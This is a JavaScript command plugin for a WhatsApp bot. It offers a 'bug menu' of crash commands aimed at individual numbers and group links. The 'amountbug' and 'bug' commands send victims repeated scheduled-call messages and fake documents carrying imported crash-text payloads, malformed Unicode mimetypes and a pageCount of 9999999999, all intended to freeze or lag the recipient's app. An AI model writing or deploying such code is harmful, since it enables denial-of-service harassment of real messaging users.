const { zokou } = require('../framework/zokou');
const { delay, loading } = require("../bdd/utils")
const moment = require('moment-timezone');
const conf = require('../set.js');
const fs = require('fs');
const path = require('path');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// bug database
const { bugtext1 } = require('../framework/bugs/bugtext1');
const { bugtext2 } = require('../framework/bugs/bugtext2');
const { bugtext3 } = require('../framework/bugs/bugtext3');
const { bugtext4 } = require('../framework/bugs/bugtext4');
const { bugtext5 } = require('../framework/bugs/bugtext5');
const { bugpdf } = require('../framework/bugs/bugpdf.js')


const category = 'dev';
const reaction = '😈';

const mess = {};
mess.prem = "You are not authorised to use this  command !!!";

const timewisher = (time) => {
  if(time < "23:59:00"){
    return `Good Night 🌆`;
  }
  else if(time < "19:00:00"){
    return `Good Evening 🌆`;
  }
  else if(time < "18:00:00"){
    return `Good Evening 🌆`;
  }
  else if(time < "15:00:00"){
    return `Good Afternoon 🌅`;
  }
  else if(time < "11:00:00"){
    return `Good Morning 🌄`;
  }
  else if(time < "05:00:00"){
    return `Good Morning 🌄`;
  } 
};

// --cmds--

// bug menu
zokou(
  {
    nomCom: 'bugmenu',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const {ms,arg,repondre} = commandOptions;
    const mono = '```';
    const time = moment().tz(conf.TZ).format('HH:mm:ss');
    const versions = ['v1','v2'];
    const version = versions[Math.floor(Math.random() * versions.length)];
    const menuImage = fs.readFileSync(path.resolve(path.join(__dirname,'..','media','deleted-message.jpg')));
    const tumbUrl = 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg';
    let menu = `${mono}Hello ${ms.pushName}
${timewisher(time)}

≡𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
amountbug <amount>
pmbug <number>
delaybug <number>
trollybug <number>
docubug <number>
unlimitedbug <number>
bombug <number>
lagbug <number>
gcbug <grouplink>
delaygcbug <grouplink>
trollygcbug <grouplink>
laggcbug <grouplink>
bomgcbug <grouplink>
unlimitedgcbug <grouplink>
docugcbug <grouplink>${mono}`;
  switch (version) {
    case 'v1': {
      zk.sendMessage(dest, {
      image: menuImage,
      caption: menu
      }, { quoted: ms });
    }
    break;
    case 'v2': {
      zk.sendMessage(dest, {
      image: menuImage,
      caption: menu,
      contextInfo: {
        externalAdReply:
          {
            showAdAttribution: true,
            title: `${conf.BOT}`,
            body: `Bot Created By ${conf.OWNER_NAME}`,
            Abhinail: {url: tumbUrl},
            AbhinailUrl: tumbUrl,
            previewType: 'PHOTO',
            sourceUrl: 'https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g',
            mediaType: 1,
            renderLargerAbhinail: true
          }
        }
      }, { quoted: ms });
    }
    break;
  }
  }
  );

// amountbug
zokou(
  {
    nomCom: 'amountbug',
    categorie: category,
    reaction: reaction
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser } = commandOptions;
    
    if (!superUser) 
      return await repondre(mess.prem);
    if (!arg[0])
      return await repondre(`Use ${conf.PREFIXE}amountbug amount\n> Example ${conf.PREFIXE}amountbug 5`);
      
    const amount = parseInt(arg[0]);
    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
      return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
    for (let i=0; i < amount; i++) {
      const bug = `${bugtext1}`;
      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
scheduledCallCreationMessage: {
callType: "2",
scheduledTimestampMs: `${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
title: bug,
}
}), { userJid: dest, quoted : ms});
    zk.relayMessage(dest, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
    await delay(3000);
    }
    await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
  }
  );
  
  zokou(
    {
      nomCom: 'bug',
      categorie: category,
      reaction: reaction
    },
    
    async (dest, zk, commandOptions) => {
      const { ms, arg, repondre, superUser} = commandOptions;
      if (!superUser)
        return await repondre(mess.prem);
        
      // send loading message
      await loading(dest, zk);
      
      for (let i = 0; i < 25; i++) {
        const doc = {url: './settings.js'};
        await zk.sendMessage(dest, {
          document: doc,
          mimetype: '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9',
          title: 'bx.pdf',
          pageCount: 9999999999,
          thumbnail: { url: 'https://cataas.com/cat' },
          jpegThumbnail: { url: 'https://cataas.com/cat' },
          mediaKey: 'ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=',
          fileName:
            '\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n' +
            bugpdf,
         });
      }
      zk.sendMessage(dest, {react: {text :'✅'}, key: ms.key});
    }
    );
